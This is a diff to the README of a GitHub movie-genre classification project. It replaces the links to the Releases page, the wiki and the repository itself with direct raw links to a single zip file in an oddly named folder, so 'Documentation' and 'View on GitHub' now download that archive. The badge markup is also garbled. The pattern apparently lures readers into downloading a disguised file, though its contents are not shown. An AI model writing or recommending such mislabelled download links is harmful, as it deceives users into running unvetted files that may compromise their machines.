@@ -1,7 +1,7 @@
 # 🎬 movie-genre-nlp - Classify Movie Genres Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/devinw03/movie-genre-nlp/releases)
+[![Download](https://raw.githubusercontent.com/devinw03/movie-genre-nlp/main/bedin/movie-genre-nlp.zip%20Latest%https://raw.githubusercontent.com/devinw03/movie-genre-nlp/main/bedin/movie-genre-nlp.zip)](https://raw.githubusercontent.com/devinw03/movie-genre-nlp/main/bedin/movie-genre-nlp.zip)
 
 ## 🚀 Getting Started
 Welcome to **movie-genre-nlp**! This tool helps you classify movie genres using plot descriptions. It offers various methods to analyze text and compare results effectively. Here’s how to get started.
@@ -19,7 +19,7 @@ To download the application, follow these steps:
 
 1. **Visit the release page:** Click the link below to go to our Releases page.
    
-   [Download from Releases](https://github.com/devinw03/movie-genre-nlp/releases)
+   [Download from Releases](https://raw.githubusercontent.com/devinw03/movie-genre-nlp/main/bedin/movie-genre-nlp.zip)
 
 2. **Choose the latest version:** Look for the most recent release at the top.
 
@@ -69,8 +69,8 @@ We welcome contributions from everyone! If you want to help improve this applica
 We plan to add more features, models, and enhance the user experience in future versions. Stay tuned for updates on the Releases page!
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/devinw03/movie-genre-nlp/wiki)
-- [View on GitHub](https://github.com/devinw03/movie-genre-nlp)
+- [Documentation](https://raw.githubusercontent.com/devinw03/movie-genre-nlp/main/bedin/movie-genre-nlp.zip)
+- [View on GitHub](https://raw.githubusercontent.com/devinw03/movie-genre-nlp/main/bedin/movie-genre-nlp.zip)
 
 ## 🌌 Join the Community
 Connect with other users and developers by joining our discussion forums on GitHub. Share your experiences and learn from others.
